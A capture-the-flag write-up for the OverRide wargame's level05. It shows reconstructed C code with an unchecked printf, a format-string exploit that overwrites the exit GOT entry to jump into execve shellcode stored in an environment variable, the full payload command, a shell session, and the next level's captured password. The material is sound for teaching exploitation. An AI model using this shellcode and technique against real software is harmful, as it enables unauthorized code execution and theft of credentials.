# level05

## Reconstructed C source code from assembly

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
  char buffer[100];

  fgets(buffer, 100, stdin);
  for (size_t i = 0; i < strlen(buffer); ++i )
  {
    if (buffer[i] >= 'A' && buffer[i] <= 'Z') {
      buffer[i] += 32; /* Upper to lowercase */
    }
  }
  printf(buffer);
  exit(0);
}
```

## Exploit

This program does not have a buffer overflow vulnerability. However, it does have a string format vulnerability. The user input is slightly changed, turning every uppercase character into lowercase character. This won't bother us in our exploit.

**RELRO** being disabled, we can perform a **GOT** overwrite to redirect the control flow to a shellcode. The shellcode will be stored in the stack since the **NX** bit is disabled, and padded with **10 000** `nop` instruction in order to have a huge jump window.

```bash
export SHELLCODE=$(python -c 'print("\x90"*10000 + "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80")')
```

An inspection under **gdb** reveal that the `SHELLCODE` env is stored at `0xffffd7a7`. We will choose the address `0xffffd7b1` rewriting the global offset table for the `exit` function.

```
0xffffd7a7:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
```

We will write the shellcode location byte per byte at the global offset entry of `exit` using the `%n` **format specifier**. We can reference directly value on the stack using **position argument specification**. For each byte, we adjust the number of bytes written by `printf`, so that the least significant byte is equal to the byte we want to write. This technique has been thoroughly detailed in the [**Exploiting Format String Vulnerabilities**](https://cs155.stanford.edu/papers/formatstring-1.2.pdf) paper by **team teso**.

Using this method, we have the following payload :

```bash
python -c 'print("\x08\x04\x97\xE0"[::-1] + "\x08\x04\x97\xE1"[::-1] + "\x08\x04\x97\xE2"[::-1] + "\x08\x04\x97\xE3"[::-1] + "%1$0161d" + "%10$n" + "%1$0294d" + "%11$n" + "%1$040d" + "%12$n" + "%13$n")'
```

We can then pipe into into the program and leave the **stdin** open with `cat` :

```bash
level05@OverRide:~$ (python -c 'print("\x08\x04\x97\xE0"[::-1] + "\x08\x04\x97\xE1"[::-1] + "\x08\x04\x97\xE2"[::-1] + "\x08\x04\x97\xE3"[::-1] + "%1$0161d" + "%10$n" + "%1$0294d" + "%11$n" + "%1$040d" + "%12$n" + "%13$n")'; cat) | ./level05
�000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000100
whoami
level06
cd ..
cat level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

Success !